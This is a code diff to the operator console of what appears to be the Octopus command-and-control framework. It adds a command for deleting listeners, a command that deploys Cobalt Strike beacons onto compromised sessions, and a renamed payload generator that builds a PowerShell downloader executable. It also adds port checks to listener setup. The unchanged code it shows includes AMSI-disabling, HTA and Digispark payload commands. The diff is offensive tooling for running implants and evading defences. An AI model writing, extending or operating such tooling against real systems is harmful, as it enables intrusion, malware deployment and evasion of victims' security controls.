@@ -59,16 +59,10 @@ while True:
             try:
                 session = connections_information[int(command.split(" ")[1])]
                 delete(session[2], int(command.split(" ")[1]))
-            except (KeyError, ValueError):
+            except:
                 print(colored("[-] Wrong listener selected !", "red"))
                 continue
 
-        # delete_listener
-
-        # TBD
-        # if command.split(" ")[0] == "delete_listener":
-        #    listener = listeners_information[int(command.split(" ")[1])]
-        #    delete(listener[0], int(command.split(" ")[1]))
 
         if command == "clear":
             os.system("clear")
@@ -102,6 +96,21 @@ while True:
                 print(colored("[-] Wrong listener selected !", "red"))
                 continue
 
+        if command.split(" ")[0] == "delete_listener":
+            try:
+                try:
+                    listener = command.split(" ")[1]
+                    delete_listener(listener)
+                except IndexError:
+                    print(colored("[-] Please select a listener !", "red"))
+                    print(colored("Syntax :  delete_listener listener_name", "green"))
+                    print(colored("Example : delete_listener listener1", "yellow"))
+
+            except:
+                print(colored("[-] Wrong listener selected !", "red"))
+                continue
+
+
         if command.split(" ")[0] == "generate_hta":
             try:
                 listener = command.split(" ")[1]
@@ -128,14 +137,14 @@ while True:
                 print(colored("[-] Wrong listener selected !", "red"))
                 continue
 
-        if command.split(" ")[0] == "generate_exe":
+        if command.split(" ")[0] == "generate_unmanaged_exe":
             try:
                 listener = command.split(" ")[1]
                 exe_path = command.split(" ")[2]
             except IndexError:
                 print(colored("[-] Please select a listener and check your options !", "red"))
-                print(colored("Syntax :  generate_exe listener_name output_path", "green"))
-                print(colored("Example : generate_exe listener1 /opt/Octopus/file.exe", "yellow"))
+                print(colored("Syntax :  generate_unmanaged_exe listener_name output_path", "green"))
+                print(colored("Example : generate_unmanaged_exe listener1 /opt/Octopus/file.exe", "yellow"))
                 continue
 
             try:
@@ -149,10 +158,11 @@ while True:
                 else:
                     proto_to_use = "http"
 
-                generate_exe(hostname, path, proto_to_use, exe_path)
+                generate_exe_powershell_downloader(hostname, path, proto_to_use, exe_path)
             except KeyError:
                 print(colored("[-] Wrong listener selected !", "red"))
                 continue
+
 # generate_digispark
         if command.split(" ")[0] == "generate_digispark":
             try:
@@ -212,6 +222,15 @@ while True:
                                 pass
                             except IndexError:
                                 print(colored("[+] Please select a module !"))
+
+                        elif scommand.split(" ")[0] == "deploy_cobalt_beacon":
+                            try:
+                                beacon_path = scommand.split(" ")[1]
+                                deploy_cobalt_beacon(session[2], beacon_path)
+                                pass
+                            except IndexError:
+                                print(colored("[+] Please select a valid beacon path!", "red"))
+
                         elif scommand == "disable_amsi":
                             disable_amsi(session[2])
                             pass
@@ -238,22 +257,28 @@ while True:
                 path = command.split(" ")[5]
                 listener_name = command.split(" ")[6]
                 if check_listener_name(listener_name):
-                    if check_url(path):
-                        listener = NewListener(
-                            listener_name,
-                            ip,
-                            port,
-                            host,
-                            interval,
-                            path
-                            )
-                        listener.start_listener()
-                        listener.create_path()
-                        #in order to make it global so we can use in other functions
-                        listeners=listener
-                        print(colored("[+]%s Listener has been created" % listener_name, "green"))
-                    else:
-                        print(colored("[-] URL name already used, please change it", "red"))
+                        if check_url(path):
+                            listener = NewListener(
+                                listener_name,
+                                ip,
+                                port,
+                                host,
+                                interval,
+                                path
+                                )
+                            if check_listener_port(ip, port):
+                                listener.start_listener()
+                                listener.create_path()
+                                listeners=listener
+                                print(colored("[+]%s Listener has been created" % listener_name, "green"))
+                            #else:
+                            #    print(colored("[-] Cannot use the same hostname for multiple urls", "red"))
+                                    #in order to make it global so we can use in other functions
+
+                            else:
+                                print(colored("[+] Port in use or you don't have permession to bind", "red"))
+                        else:
+                            print(colored("[-] URL name already used, please change it", "red"))
                 else:
                     print(colored("[-] Listener name already used, please change it", "red"))
 
@@ -284,29 +309,30 @@ while True:
                 path = command.split(" ")[5]
                 listener_name = command.split(" ")[6]
                 if check_listener_name(listener_name):
-                    key_path = command.split(" ")[7]
-                    cert_path = command.split(" ")[8]
-                    if not os.path.isfile(cert_path) or not os.path.isfile(key_path):
-                        print(colored("[-] Please check the certficate and key path", "red"))
-                    elif listener_name in list(listeners_information.keys()):
-                        print(colored("[-] Listener name already used, please change it", "red"))
-                    else:
-                        listener = NewListener(
-                            listener_name,
-                            ip,
-                            port,
-                            host,
-                            interval,
-                            path,
-                            cert_path,
-                            key_path
-                        )
-                        listener.start_listener()
-                        listener.create_path()
-                        print(colored("[+]%s Listener has been created" % listener_name, "green"))
+                        key_path = command.split(" ")[7]
+                        cert_path = command.split(" ")[8]
+                        if not os.path.isfile(cert_path) or not os.path.isfile(key_path):
+                            print(colored("[-] Please check the certficate and key path", "red"))
+                        else:
+                            listener = NewListener(
+                                listener_name,
+                                ip,
+                                port,
+                                host,
+                                interval,
+                                path,
+                                cert_path,
+                                key_path
+                            )
+                            if check_listener_port(ip, port):
+                                listener.start_listener()
+                                listener.create_path()
+                                listeners=listener
+                                print(colored("[+]%s Listener has been created" % listener_name, "green"))
+                            else:
+                                print(colored("[+] Port in use or you don't have permession to bind", "red"))
                 else:
-                    print(colored("[-] URL name already used, please change it", "red"))
-
+                        print(colored("[-] Listener name already used, please change it", "red"))
             except IndexError:
                 print(colored("[-] Please check listener arguments !", "red"))
                 print(colored("Syntax  : listen_https BindIP BindPort hostname interval URL listener_name certficate_path key_path", "green"))
